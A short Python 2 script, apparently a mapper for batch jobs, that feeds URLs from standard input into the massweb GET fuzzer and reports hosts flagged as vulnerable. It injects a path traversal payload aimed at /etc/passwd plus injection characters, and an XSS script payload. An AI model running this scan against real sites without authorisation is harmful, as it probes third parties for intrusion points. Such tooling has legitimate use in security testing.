from urlparse import urlparse
import sys
from massweb.fuzzers.get_fuzzer import GetFuzzer

def mapper():

    gf = GetFuzzer(num_threads = 50)
    gf.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
    gf.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])

    for line in sys.stdin:

        line = line.strip()
        gf.add_target_from_url(line)

    for r in gf.fuzz():
        if True in r.result_dic.values():
            print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)

if __name__ == "__main__":

    mapper()
